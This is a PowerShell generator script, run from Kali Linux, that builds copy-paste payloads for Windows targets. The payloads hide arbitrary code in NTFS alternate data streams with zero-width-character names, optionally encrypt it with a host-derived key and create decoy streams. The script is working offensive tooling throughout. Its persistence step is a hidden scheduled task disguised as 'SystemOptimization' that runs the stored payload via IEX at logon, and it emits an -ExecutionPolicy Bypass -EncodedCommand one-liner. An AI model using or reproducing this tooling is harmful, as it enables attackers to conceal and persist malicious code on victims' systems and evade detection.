<#
.SYNOPSIS
    Build-ADSOneLiner.ps1 - Generate copy-paste ADS deployment payloads (Linux → Windows)

.DESCRIPTION
    Linux-friendly generator that creates minimal PowerShell payloads for Windows targets.
    
    Outputs:
    - Base64-encoded one-liner (compact, copy-paste ready)
    - Readable multi-line version (debugging, modification)
    
    Manifest saved to Linux machine ONLY (never sent to Windows target).

.PARAMETER Payload
    Payload content (or use -PayloadAtDeployment for runtime input)

.PARAMETER PayloadAtDeployment
    Generate code that prompts for payload on Windows target

.PARAMETER ZeroWidthMode
    'single', 'multi', or 'hybrid' (default: single)

.PARAMETER HybridPrefix
    Prefix for hybrid mode (e.g., 'Zone.Identifier')

.PARAMETER Persist
    Persistence method: task, registry, wmi, none (default: task)

.PARAMETER CreateDecoys
    Number of decoy streams (0-10, default: 0)

.PARAMETER Encrypt
    Enable AES-256 encryption

.PARAMETER Randomize
    Randomize host file and stream names

.PARAMETER OutputFile
    Where to save generated payload (default: ads-payload.txt)

.PARAMETER ManifestDir
    Directory for manifest on Linux (default: ./manifests)

.EXAMPLE
    # Payload at generation (Linux)
    pwsh Build-ADSOneLiner.ps1 -Payload "IEX(...)" -ZeroWidthMode single -Persist task

.EXAMPLE
    # Payload at deployment (Windows)
    pwsh Build-ADSOneLiner.ps1 -PayloadAtDeployment -ZeroWidthMode hybrid -CreateDecoys 3

.NOTES
    Run on Linux (Kali) with PowerShell Core (pwsh)
    Output designed for Windows target copy-paste
#>

[CmdletBinding()]
param(
    [string]$Payload,
    [switch]$PayloadAtDeployment,
    
    [ValidateSet('single', 'multi', 'hybrid')]
    [string]$ZeroWidthMode = 'single',
    
    [string]$HybridPrefix,
    
    [ValidateSet('task', 'registry', 'wmi', 'none')]
    [string]$Persist = 'task',
    
    [ValidateRange(0, 10)]
    [int]$CreateDecoys = 0,
    
    [switch]$Encrypt,
    [switch]$Randomize,
    
    [string]$OutputFile = "ads-payload.txt",
    [string]$ManifestDir = "./manifests"
)

Write-Host @"

═══════════════════════════════════════════════════════════════
 ADS One-Liner Generator (Linux → Windows)
═══════════════════════════════════════════════════════════════

"@ -ForegroundColor Cyan

# Validate
if (-not $Payload -and -not $PayloadAtDeployment) {
    Write-Error "Provide -Payload or use -PayloadAtDeployment"
    exit 1
}

if ($Payload -and $PayloadAtDeployment) {
    Write-Error "Cannot use both -Payload and -PayloadAtDeployment"
    exit 1
}

#region Core Functions (Minimal for deployment)

$coreFunctions = @'
# Zero-Width Character Database
$script:ZWC = @(0x061C,0x180E,0x200B,0x200C,0x200D,0x200E,0x200F,0x202A,0x202B,0x202C,0x202D,0x202E,0x2060,0xFEFF)

function Generate-ZeroWidthStream {
    param([string]$Mode='single',[string]$Prefix,[int]$Length=3)
    switch ($Mode) {
        'single' { [char]($script:ZWC|Get-Random) }
        'multi' { -join (1..$Length|%{[char]($script:ZWC|Get-Random)}) }
        'hybrid' {
            if (!$Prefix) { $Prefix=@('Zone.Identifier','Summary','Comments')|Get-Random }
            "$Prefix$([char]($script:ZWC|Get-Random))"
        }
        default { -join ((65..90)+(97..122)|Get-Random -Count 8|%{[char]$_}) }
    }
}

function Get-HostDerivedKey {
    try {
        $h=@($env:COMPUTERNAME,(Get-WmiObject Win32_ComputerSystemProduct -EA 0).UUID,(Get-WmiObject Win32_BaseBoard -EA 0).SerialNumber)-join'|'
        $sha=[System.Security.Cryptography.SHA256]::Create()
        $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($h))
    } catch {
        [System.Text.Encoding]::UTF8.GetBytes('ADS-Fallback-Key-32-Bytes-Long!')
    }
}

function Protect-Payload {
    param([string]$PlainText,[byte[]]$Key)
    $aes=[System.Security.Cryptography.Aes]::Create()
    $aes.Key=$Key;$aes.GenerateIV()
    $enc=$aes.CreateEncryptor()
    $pb=[System.Text.Encoding]::UTF8.GetBytes($PlainText)
    $eb=$enc.TransformFinalBlock($pb,0,$pb.Length)
    [Convert]::ToBase64String($aes.IV+$eb)
}

function Unprotect-Payload {
    param([string]$EncryptedData,[byte[]]$Key)
    $eb=[Convert]::FromBase64String($EncryptedData)
    $aes=[System.Security.Cryptography.Aes]::Create()
    $aes.Key=$Key;$aes.IV=$eb[0..15]
    $dec=$aes.CreateDecryptor()
    $ct=$eb[16..($eb.Length-1)]
    $pb=$dec.TransformFinalBlock($ct,0,$ct.Length)
    [System.Text.Encoding]::UTF8.GetString($pb)
}

function Create-DecoyStreams {
    param([string]$HostPath,[int]$Count)
    if ($Count -le 0){return}
    $n=@(':Zone.Identifier',':Summary',':Comments',':Author')
    $c=@("[ZoneTransfer]`r`nZoneId=3",'Document summary','Internal use')
    0..[Math]::Min($Count-1,$n.Count-1)|%{$c|Get-Random|Set-Content "$HostPath$($n[$_])" -Force}
}
'@

#endregion

#region Generate Configuration

Write-Host "[*] Generating configuration..." -ForegroundColor White

$config = @{
    HostPath = if ($Randomize) {
        'C:\ProgramData\'+(-join((65..90)+(97..122)|Get-Random -Count 8|%{[char]$_}))+'.dat'
    } else {
        'C:\ProgramData\SystemCache.dat'
    }
    ZeroWidthMode = $ZeroWidthMode
    HybridPrefix = $HybridPrefix
    Persist = $Persist
    CreateDecoys = $CreateDecoys
    Encrypt = $Encrypt.IsPresent
    Randomize = $Randomize.IsPresent
    PayloadAtDeployment = $PayloadAtDeployment.IsPresent
}

# Simulate stream name generation for manifest
if (-not $PayloadAtDeployment) {
    $zwc = @(0x061C,0x180E,0x200B,0x200C,0x200D,0x200E,0x200F,0x202A,0x202B,0x202C,0x202D,0x202E,0x2060,0xFEFF)
    $config.StreamName = switch ($ZeroWidthMode) {
        'single' { [char]($zwc|Get-Random) }
        'multi' { -join(1..3|%{[char]($zwc|Get-Random)}) }
        'hybrid' {
            $p=if($HybridPrefix){$HybridPrefix}else{'Zone.Identifier'}
            "$p$([char]($zwc|Get-Random))"
        }
        default { 'payload' }
    }
    
    $chars = $config.StreamName.ToCharArray()
    $config.Codepoints = ($chars|%{"U+{0:X4}" -f [int]$_})-join' '
}

Write-Host "[+] Configuration generated" -ForegroundColor Green
Write-Host "    Host: $($config.HostPath)" -ForegroundColor Gray
if ($config.Codepoints) {
    Write-Host "    Stream Codepoints: $($config.Codepoints)" -ForegroundColor Yellow
}

#endregion

#region Build Deployment Script

Write-Host "[*] Building deployment script..." -ForegroundColor White

$deployScript = @"
$coreFunctions

`$hp='$($config.HostPath)'
`$zw='$($config.ZeroWidthMode)'
`$zp='$($config.HybridPrefix)'
`$ps='$($config.Persist)'
`$cd=$($config.CreateDecoys)
`$en=`$$($config.Encrypt)

`$sn=Generate-ZeroWidthStream -Mode `$zw -Prefix `$zp
if(!(Test-Path `$hp)){New-Item `$hp -ItemType File -Force|Out-Null}

"@

if ($PayloadAtDeployment) {
    $deployScript += "`$pl=Read-Host 'Enter payload'`n"
} else {
    $esc = $Payload -replace "'","''" -replace '"','\"'
    $deployScript += "`$pl='$esc'`n"
}

$deployScript += @"

if(`$en){
    `$k=Get-HostDerivedKey
    `$pl=Protect-Payload -PlainText `$pl -Key `$k
}

`$pl|Set-Content "`$hp`:`$sn" -Force

if(`$cd -gt 0){Create-DecoyStreams -HostPath `$hp -Count `$cd}

if(`$ps -ne 'none'){
    `$ld=if(`$en){"```$k=Get-HostDerivedKey;```$e=Get-Content '`$hp`:`$sn' -Raw;```$p=Unprotect-Payload -EncryptedData ```$e -Key ```$k;IEX ```$p"}else{"```$p=Get-Content '`$hp`:`$sn' -Raw;IEX ```$p"}
    
    if(`$ps -eq 'task'){
        `$tn='SystemOptimization'
        `$lp="`$env:TEMP\$([guid]::NewGuid().ToString().Substring(0,8)).ps1"
        `$ld|Out-File `$lp -Encoding UTF8
        `$a=New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -NoProfile -Command `$ld"
        `$t=New-ScheduledTaskTrigger -AtLogOn
        `$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -Hidden
        Register-ScheduledTask -TaskName `$tn -Action `$a -Trigger `$t -Settings `$s -Force|Out-Null
    }
}

Write-Host '[+] Deployment complete' -ForegroundColor Green
"@

#endregion

#region Generate Output Formats

Write-Host "[*] Generating output formats..." -ForegroundColor White

# Base64 encode
$bytes = [System.Text.Encoding]::Unicode.GetBytes($deployScript)
$encoded = [Convert]::ToBase64String($bytes)

# Build output
$output = @"
═══════════════════════════════════════════════════════════════
 ADS Deployment Payload
 Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
═══════════════════════════════════════════════════════════════

CONFIGURATION:
  Host File: $($config.HostPath)
  Zero-Width: $($config.ZeroWidthMode)$(if($config.HybridPrefix){" (prefix: $($config.HybridPrefix))"})
  Persistence: $($config.Persist)
  Decoys: $($config.CreateDecoys)
  Encryption: $($config.Encrypt)
  Payload Input: $(if($PayloadAtDeployment){'At Deployment'}else{'At Generation'})

$(if($config.Codepoints){
@"
MANIFEST (Linux-side):
  Stream Codepoints: $($config.Codepoints)
  Byte Sequence: Will be logged in manifest file
  Recovery Command: ConvertFrom-Codepoints -Codepoints '$($config.Codepoints)'
"@
})

═══════════════════════════════════════════════════════════════
 OPTION 1: Base64 Encoded One-Liner (Recommended)
═══════════════════════════════════════════════════════════════

powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encoded

═══════════════════════════════════════════════════════════════
 OPTION 2: Readable Multi-Line Version (For Debugging)
═══════════════════════════════════════════════════════════════

$deployScript

═══════════════════════════════════════════════════════════════
 USAGE ON WINDOWS TARGET:
═══════════════════════════════════════════════════════════════

1. Open PowerShell on Windows target (as admin if needed)
2. Copy-paste OPTION 1 (one-liner) or OPTION 2 (multi-line)
3. Press Enter
$(if($PayloadAtDeployment){"4. Enter your payload when prompted"})

═══════════════════════════════════════════════════════════════
 CLEANUP (After Operation):
═══════════════════════════════════════════════════════════════

# View ADS
Get-Item '$($config.HostPath)' -Stream *

$(if($config.Codepoints){
@"
# Recover stream name
`$sn = ConvertFrom-Codepoints -Codepoints '$($config.Codepoints)'
Remove-Item '$($config.HostPath)':`$sn -Force
"@
} else {
@"
# If using zero-width (codepoints logged in manifest)
# Get codepoints from manifest, then:
# `$sn = ConvertFrom-Codepoints -Codepoints '<from_manifest>'
# Remove-Item '$($config.HostPath)':`$sn -Force
"@
})

# Remove task
Unregister-ScheduledTask -TaskName 'SystemOptimization' -Confirm:`$false

# Remove host file
Remove-Item '$($config.HostPath)' -Force

═══════════════════════════════════════════════════════════════

"@

# Save output
$output | Out-File -FilePath $OutputFile -Encoding UTF8 -Force
Write-Host "[+] Payload saved to: $OutputFile" -ForegroundColor Green

#endregion

#region Save Manifest (Linux Only)

if (-not $PayloadAtDeployment) {
    Write-Host "[*] Saving manifest to Linux machine..." -ForegroundColor White
    
    if (-not (Test-Path $ManifestDir)) {
        New-Item -Path $ManifestDir -ItemType Directory -Force | Out-Null
    }
    
    $timestamp = Get-Date -Format "yyyyMMdd-HHmmss"
    $manifestFile = Join-Path $ManifestDir "manifest-$timestamp.json"
    
    $manifest = @{
        Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss UTC"
        TargetHost = "UNKNOWN_WINDOWS_TARGET"
        HostPath = $config.HostPath
        StreamName = $config.StreamName
        Codepoints = $config.Codepoints
        ByteSequence = ([System.Text.Encoding]::Unicode.GetBytes($config.StreamName) | 
                        ForEach-Object { "0x{0:X2}" -f $_ }) -join ' '
        ZeroWidthMode = $config.ZeroWidthMode
        HybridPrefix = $config.HybridPrefix
        Persistence = $config.Persist
        Encrypted = $config.Encrypt
        DecoysCount = $config.CreateDecoys
        PayloadHash = (Get-FileHash -InputStream ([System.IO.MemoryStream]::new(
            [System.Text.Encoding]::UTF8.GetBytes($Payload))) -Algorithm SHA256).Hash
        Operator = $env:USER
        GeneratedOn = hostname
        GeneratedFrom = $PSCommandPath
        OutputFile = $OutputFile
    }
    
    $manifest | ConvertTo-Json -Depth 10 | Out-File -FilePath $manifestFile -Encoding UTF8 -Force
    
    Write-Host "[+] Manifest saved to: $manifestFile" -ForegroundColor Green
    Write-Host "    Keep this safe for recovery!" -ForegroundColor Yellow
}

#endregion

#region Summary

Write-Host @"

═══════════════════════════════════════════════════════════════
 SUMMARY
═══════════════════════════════════════════════════════════════

✓ Deployment payload generated
✓ Output saved to: $OutputFile
$(if(-not $PayloadAtDeployment){"✓ Manifest saved to: $ManifestDir"})

NEXT STEPS:
1. Review $OutputFile
2. Copy OPTION 1 (base64) or OPTION 2 (readable) to Windows target  
3. Execute on target
$(if(-not $PayloadAtDeployment){"4. Keep manifest safe for stream recovery"})

WARNING: Zero-width streams cannot be copy-pasted!
         Always save the manifest for recovery.

═══════════════════════════════════════════════════════════════

"@ -ForegroundColor Cyan

#endregion


